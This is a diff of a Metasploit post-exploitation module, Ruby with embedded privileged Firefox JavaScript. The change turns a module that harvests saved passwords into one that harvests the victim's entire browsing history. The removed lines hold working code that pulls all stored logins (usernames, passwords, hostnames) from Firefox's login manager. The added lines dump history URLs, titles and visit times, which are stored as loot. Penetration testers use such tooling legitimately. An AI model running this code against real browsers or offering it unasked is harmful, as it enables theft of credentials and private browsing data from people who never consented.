@@ -14,9 +14,10 @@ class Metasploit3 < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
-      'Name'          => 'Firefox Gather Passwords from Privileged Javascript Shell',
+      'Name'          => 'Firefox Gather History from Privileged Javascript Shell',
       'Description'   => %q{
-        This module allows collection of passwords from a Firefox Privileged Javascript Shell.
+        This module allows collection of the entire browser history from a Firefox
+        Privileged Javascript Shell.
       },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'joev' ],
@@ -34,13 +35,13 @@ class Metasploit3 < Msf::Post
     results = session.shell_read_until_token("[!JAVASCRIPT]", 0, datastore['TIMEOUT'])
     if results.present?
       begin
-        passwords = JSON.parse(results)
-        passwords.each do |entry|
+        history = JSON.parse(results)
+        history.each do |entry|
           entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
         end
 
-        file = store_loot("firefox.passwords.json", "text/json", rhost, passwords.to_json)
-        print_good("Saved #{passwords.length} passwords to #{file}")
+        file = store_loot("firefox.history.json", "text/json", rhost, history.to_json)
+        print_good("Saved #{history.length} history entries to #{file}")
       rescue JSON::ParserError => e
         print_warning(results)
       end
@@ -51,29 +52,35 @@ class Metasploit3 < Msf::Post
     %Q|
       (function(send){
         try {
-          var manager = Components
-                          .classes["@mozilla.org/login-manager;1"]
-                          .getService(Components.interfaces.nsILoginManager);
-          var logins = manager.getAllLogins();
-          var passwords = [];
+          var service = Components
+                .classes["@mozilla.org/browser/nav-history-service;1"]
+                .getService(Components.interfaces.nsINavHistoryService);
           var b64 = Components.utils.import("resource://gre/modules/Services.jsm").btoa;
-          var fields = ['password', 'passwordField', 'username', 'usernameField',
-                        'httpRealm', 'formSubmitURL', 'hostname'];
 
-          var sanitize = function(passwdObj) {
-            var sanitized = { };
-            for (var i in fields) {
-              sanitized[fields[i]] = b64(passwdObj[fields[i]]);
+          var query = service.getNewQuery();
+          var options = service.getNewQueryOptions();
+          var result = service.executeQuery(query, options);
+          var fields = [];
+          var entries = [];
+
+          var root = result.root;
+          root.containerOpen = true;
+
+          for (var i = 0; i < result.root.childCount; ++i) {
+            var child = result.root.getChild(i);
+            if (child.type == child.RESULT_TYPE_URI) {
+              entries.push({
+                uri: b64(child.uri),
+                title: b64(child.title),
+                time: b64(child.time),
+                accessCount: b64(child.accessCount)
+              });
             }
-            return sanitized;
           }
 
-          // Find user from returned array of nsILoginInfo objects
-          for (var i = 0; i < logins.length; i++) {
-            passwords.push(sanitize(logins[i]));
-          }
+          result.root.containerOpen = false;
 
-          send(JSON.stringify(passwords));
+          send(JSON.stringify(entries));
         } catch (e) {
           send(e);
         }
